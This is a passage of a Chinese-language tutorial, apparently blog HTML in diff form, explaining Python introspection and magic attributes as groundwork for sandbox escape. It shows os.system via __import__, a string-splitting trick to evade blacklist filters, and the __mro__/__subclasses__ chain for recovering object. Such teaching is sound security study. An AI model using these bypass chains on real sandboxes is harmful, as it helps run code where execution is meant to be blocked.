+<h2 id="命名空间与作用域"><a href="#命名空间与作用域" class="headerlink" title="命名空间与作用域"></a>命名空间与作用域</h2><table>
+<thead>
+<tr>
+<th>工具&#x2F;函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>globals()</code></td>
+<td>返回当前模块的全局变量字典（可读写）</td>
+</tr>
+<tr>
+<td><code>locals()</code></td>
+<td>返回当前局部作用域的变量字典（只读&#x2F;只写）</td>
+</tr>
+<tr>
+<td><code>vars([obj])</code></td>
+<td>返回对象的 <code>__dict__</code>，或当前局部变量字典</td>
+</tr>
+</tbody></table>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    y = <span class="number">20</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;globals:&quot;</span>, <span class="built_in">globals</span>().keys())  <span class="comment"># 包括 x、func 等</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;locals:&quot;</span>, <span class="built_in">locals</span>().keys())    <span class="comment"># 只有 y</span></span><br><span class="line"></span><br><span class="line">func()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="文档与帮助"><a href="#文档与帮助" class="headerlink" title="文档与帮助"></a>文档与帮助</h2><table>
+<thead>
+<tr>
+<th>工具&#x2F;函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>help(obj)</code></td>
+<td>显示帮助文档（交互式）</td>
+</tr>
+<tr>
+<td><code>obj.__doc__</code></td>
+<td>返回对象的 docstring</td>
+</tr>
+<tr>
+<td><code>__annotations__</code></td>
+<td>返回类型注解信息</td>
+</tr>
+</tbody></table>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;加法函数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add.__doc__)            <span class="comment"># &quot;加法函数&quot;</span></span><br><span class="line"><span class="built_in">print</span>(add.__annotations__)    <span class="comment"># &#123;&#x27;x&#x27;: int, &#x27;y&#x27;: int, &#x27;return&#x27;: int&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="inspect-模块"><a href="#inspect-模块" class="headerlink" title="inspect 模块"></a>inspect 模块</h2><p><code>inspect</code> 是 Python 标准库中的 introspection 工具集，可用于：</p>
+<ul>
+<li>函数参数签名分析</li>
+<li>获取源码、定义位置、文档</li>
+<li>判断对象类型（是否函数、类、方法、生成器等）</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>常用函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>inspect.getsource(obj)</code></td>
+<td>获取对象的源代码</td>
+</tr>
+<tr>
+<td><code>inspect.getdoc(obj)</code></td>
+<td>获取对象的 docstring</td>
+</tr>
+<tr>
+<td><code>inspect.signature(func)</code></td>
+<td>获取函数的签名信息</td>
+</tr>
+<tr>
+<td><code>inspect.isfunction(obj)</code></td>
+<td>是否是函数</td>
+</tr>
+<tr>
+<td><code>inspect.getfile(obj)</code></td>
+<td>返回定义对象的源码文件路径</td>
+</tr>
+<tr>
+<td><code>inspect.ismethod(obj)</code></td>
+<td>是否是方法（类中定义）</td>
+</tr>
+<tr>
+<td><code>inspect.getmembers(obj)</code></td>
+<td>获取成员名和值的元组列表</td>
+</tr>
+</tbody></table>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name: <span class="built_in">str</span> = <span class="string">&quot;Tom&quot;</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;打招呼&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Hello <span class="subst">&#123;name&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(inspect.getsource(greet))         <span class="comment"># 查看源码</span></span><br><span class="line"><span class="built_in">print</span>(inspect.getdoc(greet))            <span class="comment"># 打招呼</span></span><br><span class="line"><span class="built_in">print</span>(inspect.signature(greet))         <span class="comment"># (name: str = &#x27;Tom&#x27;) -&gt; str</span></span><br><span class="line"><span class="built_in">print</span>(inspect.getmembers(greet))        <span class="comment"># 所有成员信息（包括 __code__、__defaults__ 等）</span></span><br></pre></td></tr></table></figure></div>
+
+<h1 id="魔术方法-属性"><a href="#魔术方法-属性" class="headerlink" title="魔术方法 &#x2F; 属性"></a>魔术方法 &#x2F; 属性</h1><p>Python 中以 <code>__xxx__</code> 命名的属性&#x2F;方法被称为魔术方法（magic methods）或魔术属性。它们允许你<strong>自定义对象的行为、重载操作符、控制生命周期和访问机制</strong>等。</p>
+<p>在沙箱逃逸、权限绕过、动态执行中，这些方法和属性也能被用作关键入口。</p>
+<h2 id="模块-作用域相关"><a href="#模块-作用域相关" class="headerlink" title="模块 &#x2F; 作用域相关"></a>模块 &#x2F; 作用域相关</h2><h3 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h3><p><code>__builtins__</code> 是由 <strong>Python 解释器自动注入</strong>的一个<strong>模块对象</strong>，它在<strong>每个作用域（全局）</strong>中默认存在。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>()</span><br><span class="line">[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(__builtins__)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;module&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>模块对象本质上是一个<strong>命名空间容器</strong>，其中包含该模块中定义的所有内容，如函数、变量、类等。这里的命名空间容器是指模块对象中的 <code>__dict__</code> 属性，记录了该模块中定义的所有名字与对象的映射。</p>
+</blockquote>
+<p><code>__builtins__</code> 指向模块 <code>builtins</code>，该模块包含了所有 Python 的内置函数、异常、基本类型等，提供当前作用域中所有内置对象的访问能力。像 <code>print()</code>、<code>len()</code>、<code>open()</code>、<code>Exception</code> 等，都是从 <code>__builtins__</code> 来的（例如 <code>__builtins__.print</code>）。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(__builtins__)</span><br><span class="line">[<span class="string">&#x27;ArithmeticError&#x27;</span>, <span class="string">&#x27;AssertionError&#x27;</span>, <span class="string">&#x27;AttributeError&#x27;</span>, <span class="string">&#x27;BaseException&#x27;</span>, <span class="string">&#x27;BaseExceptionGroup&#x27;</span>, <span class="string">&#x27;BlockingIOError&#x27;</span>, <span class="string">&#x27;BrokenPipeError&#x27;</span>, <span class="string">&#x27;BufferError&#x27;</span>, <span class="string">&#x27;BytesWarning&#x27;</span>, <span class="string">&#x27;ChildProcessError&#x27;</span>, <span class="string">&#x27;ConnectionAbortedError&#x27;</span>, <span class="string">&#x27;ConnectionError&#x27;</span>, <span class="string">&#x27;ConnectionRefusedError&#x27;</span>, <span class="string">&#x27;ConnectionResetError&#x27;</span>, <span class="string">&#x27;DeprecationWarning&#x27;</span>, <span class="string">&#x27;EOFError&#x27;</span>, <span class="string">&#x27;Ellipsis&#x27;</span>, <span class="string">&#x27;EncodingWarning&#x27;</span>, <span class="string">&#x27;EnvironmentError&#x27;</span>, <span class="string">&#x27;Exception&#x27;</span>, <span class="string">&#x27;ExceptionGroup&#x27;</span>, <span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;FileExistsError&#x27;</span>, <span class="string">&#x27;FileNotFoundError&#x27;</span>, <span class="string">&#x27;FloatingPointError&#x27;</span>, <span class="string">&#x27;FutureWarning&#x27;</span>, <span class="string">&#x27;GeneratorExit&#x27;</span>, <span class="string">&#x27;IOError&#x27;</span>, <span class="string">&#x27;ImportError&#x27;</span>, <span class="string">&#x27;ImportWarning&#x27;</span>, <span class="string">&#x27;IndentationError&#x27;</span>, <span class="string">&#x27;IndexError&#x27;</span>, <span class="string">&#x27;InterruptedError&#x27;</span>, <span class="string">&#x27;IsADirectoryError&#x27;</span>, <span class="string">&#x27;KeyError&#x27;</span>, <span class="string">&#x27;KeyboardInterrupt&#x27;</span>, <span class="string">&#x27;LookupError&#x27;</span>, <span class="string">&#x27;MemoryError&#x27;</span>, <span class="string">&#x27;ModuleNotFoundError&#x27;</span>, <span class="string">&#x27;NameError&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;NotADirectoryError&#x27;</span>, <span class="string">&#x27;NotImplemented&#x27;</span>, <span class="string">&#x27;NotImplementedError&#x27;</span>, <span class="string">&#x27;OSError&#x27;</span>, <span class="string">&#x27;OverflowError&#x27;</span>, <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>, <span class="string">&#x27;PermissionError&#x27;</span>, <span class="string">&#x27;ProcessLookupError&#x27;</span>, <span class="string">&#x27;RecursionError&#x27;</span>, <span class="string">&#x27;ReferenceError&#x27;</span>, <span class="string">&#x27;ResourceWarning&#x27;</span>, <span class="string">&#x27;RuntimeError&#x27;</span>, <span class="string">&#x27;RuntimeWarning&#x27;</span>, <span class="string">&#x27;StopAsyncIteration&#x27;</span>, <span class="string">&#x27;StopIteration&#x27;</span>, <span class="string">&#x27;SyntaxError&#x27;</span>, <span class="string">&#x27;SyntaxWarning&#x27;</span>, <span class="string">&#x27;SystemError&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>, <span class="string">&#x27;TabError&#x27;</span>, <span class="string">&#x27;TimeoutError&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;TypeError&#x27;</span>, <span class="string">&#x27;UnboundLocalError&#x27;</span>, <span class="string">&#x27;UnicodeDecodeError&#x27;</span>, <span class="string">&#x27;UnicodeEncodeError&#x27;</span>, <span class="string">&#x27;UnicodeError&#x27;</span>, <span class="string">&#x27;UnicodeTranslateError&#x27;</span>, <span class="string">&#x27;UnicodeWarning&#x27;</span>, <span class="string">&#x27;UserWarning&#x27;</span>, <span class="string">&#x27;ValueError&#x27;</span>, <span class="string">&#x27;Warning&#x27;</span>, <span class="string">&#x27;ZeroDivisionError&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;aiter&#x27;</span>, <span class="string">&#x27;all&#x27;</span>, <span class="string">&#x27;anext&#x27;</span>, <span class="string">&#x27;any&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;bool&#x27;</span>, <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;bytearray&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;callable&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;classmethod&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;complex&#x27;</span>, <span class="string">&#x27;copyright&#x27;</span>, <span class="string">&#x27;credits&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;divmod&#x27;</span>, <span class="string">&#x27;enumerate&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;float&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;frozenset&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;hasattr&#x27;</span>, <span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;isinstance&#x27;</span>, <span class="string">&#x27;issubclass&#x27;</span>, <span class="string">&#x27;iter&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;license&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;oct&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;reversed&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;slice&#x27;</span>, <span class="string">&#x27;sorted&#x27;</span>, <span class="string">&#x27;staticmethod&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;super&#x27;</span>, <span class="string">&#x27;tuple&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="import"><a href="#import" class="headerlink" title="__import__"></a><code>__import__</code></h3><p><code>__import__</code> 是 Python 的一个 <strong>内置函数（builtin function）</strong>，它由内置模块 <code>builtins</code> 提供。这个函数是所有 <code>import xxx</code> 语句的底层实现机制。你可以用它在运行时动态地导入模块。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>提示</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p>由于 <code>__import__</code> 可接受 <strong>字符串参数</strong>，因此可以用于 <strong>绕过静态字符串过滤</strong>（如黑名单）：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).system(<span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;lc&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+    </div>
+  </div>
+
+<p><code>__import__</code> 获取的是模块名称对应的 <strong>模块对象（module object）</strong>。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> (frozen)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>))</span><br><span class="line">[<span class="string">&#x27;DirEntry&#x27;</span>, <span class="string">&#x27;F_OK&#x27;</span>, <span class="string">&#x27;MutableMapping&#x27;</span>, <span class="string">&#x27;O_APPEND&#x27;</span>, <span class="string">&#x27;O_BINARY&#x27;</span>, ..., <span class="string">&#x27;walk&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;writev&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a><code>__dict__</code></h3><p><code>__dict__</code> 是 Python 中的大多数对象（如模块、类、实例、函数等）自带的一个<strong>内省属性</strong>，它以字典形式保存了该对象的<strong>命名空间（namespace）</strong>，也就是这个对象所拥有的所有“<strong>可写属性</strong>”。</p>
+<p>这是对象的一个内部属性，底层就是一个字典，记录了对象有哪些属性（包括你手动赋值的变量、函数等）。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__ == <span class="built_in">globals</span>()</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="class"><a href="#class" class="headerlink" title="__class__"></a><code>__class__</code></h3><p><code>__class__</code> 是<strong>所有 Python 对象</strong>都拥有的一个属性，表示该<strong>对象的类</strong>，也就是<strong>该对象是由哪个类创建的</strong>。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__class__.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>
+
+
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>提示</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <ul>
+<li><p><strong>类</strong> 本身也是一个对象 —— 它是 <code>type</code> 类的实例。所以当我们说“类对象”，就是指：<strong>一个对象，它是通过 <code>type</code> 类构造出来的。</strong></p>
+</li>
+<li><p><code>type</code> 类本身也是一个对象，它的类还是 <code>type</code>（是自己创建自己的类）。</p>
+</li>
+<li><p><code>builtins</code> 模块中提供了大量 <strong><code>type</code> 的实例</strong>，也就是我们平时使用的 <strong>内置类型（类）</strong>，例如 <code>str</code>，<code>int</code> 等。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__ == <span class="built_in">str</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div></li>
+</ul>
+
+    </div>
+  </div>
+
+<h3 id="bases"><a href="#bases" class="headerlink" title="__bases__"></a><code>__bases__</code></h3><p><code>__bases__</code> 是<strong>类对象</strong>（类型为 <code>type</code> 的对象）的一个属性，表示该类的<strong>直接父类</strong>（基类）组成的<strong>元组</strong>。另外类对象还有一个 <code>__base__</code> 属性，它返回的是 <strong><code>__bases__</code> 元组的第一个元素</strong>。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__bases__</span><br><span class="line">()</span><br></pre></td></tr></table></figure></div>
+
+
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>提示</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <ul>
+<li><p>因为 <strong>Python 支持多重继承</strong>，一个类可以有多个父类，所以<code>__bases__</code> 返回的是一个 <strong>元组</strong>。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>: <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>: <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(A, B): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(C.__bases__)</span><br><span class="line"><span class="comment"># 输出: (&lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;)</span></span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>所有类最终都继承自 <code>object</code>，因为 <code>object</code> 是 <strong>所有新式类（Python 3 全部是新式类）</strong> 的根基类。而 <code>object.__base__</code> 返回一个空元组 <code>()</code>，说明它没有基类。</p>
+</li>
+<li></li>
+</ul>
+
+    </div>
+  </div>
+
+<h3 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a><code>__mro__</code></h3><p><code>__mro__</code>（Method Resolution Order）是<strong>类对象</strong>的一个<strong>属性</strong>，返回该类的<strong>方法解析顺序</strong>，即调用方法时按照哪些顺序查找类中的方法。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure></div>
+
+
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>提示</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p>当沙箱清空了 <code>__builtins__</code> 中的内置类时（没有 <code>object</code> 等内置的类 ），我们通常使用 <code>__mro__</code> 来获得一个 <code>object</code> 类。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>
+
+    </div>
+  </div>
+
+<h3 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__()"></a><code>__subclasses__()</code></h3><p><code>__subclasses__()</code> 是<strong>类</strong>的一个方法，用于获取该类的<strong>所有直接子类</strong>。它返回一个<strong>列表</strong>，包含了当前运行环境中，从该类<strong>直接继承</strong>的所有类（子类对象）。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>: <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">B</span>): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">A.__subclasses__()   <span class="comment"># ✅ [&lt;class &#x27;__main__.B&#x27;&gt;]</span></span><br><span class="line">B.__subclasses__()   <span class="comment"># ✅ [&lt;class &#x27;__main__.C&#x27;&gt;]</span></span><br><span class="line">C.__subclasses__()   <span class="comment"># ✅ []</span></span><br><span class="line">A().__subclasses__() <span class="comment"># ❌ AttributeError：实例对象没有这个方法</span></span><br></pre></td></tr></table></figure></div>
+
+
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>提示</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p>因为所有的类都所有类最终都继承自 <code>object</code>，因此我们可以先找到 <code>object</code> 类，然后再通过 <code>object.__subclasses__()</code> 找到所需的类。 </p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2. 获取其所有子类</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()</span><br></pre></td></tr></table></figure></div>
+
+    </div>
+  </div>
+
+<h2 id="函数-方法的执行环境"><a href="#函数-方法的执行环境" class="headerlink" title="函数 &#x2F; 方法的执行环境"></a>函数 &#x2F; 方法的执行环境</h2><h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h3><p><code>__globals__</code> 是 <strong>Python 函数对象</strong>独有的一个特殊属性，它指向一个<strong>字典对象</strong>，即该函数<strong>定义时所处模块的全局命名空间</strong>（也叫全局作用域，或 module namespace）。换句话说，**<code>__globals__</code> 等价于函数定义所在模块的 <code>globals()</code> 返回值**。你可以通过这个属性，访问定义函数时所在模块的所有全局变量，包括导入的模块、函数、类、常量等。</p>
+<p><code>__globals__</code> 是指<strong>函数定义时所在模块的作用域</strong>，只属于函数对象；而 <code>__dict__</code> 是<strong>对象自身的命名空间字典</strong>，适用于大多数对象（模块、类、实例、函数等）。其中<strong>模块的 <code>__dict__</code></strong> 等于<strong>模块中定义的函数的 <code>__globals__</code></strong> 等于<strong>在模块中调用 <code>globals()</code> 函数的返回结果</strong>。</p>
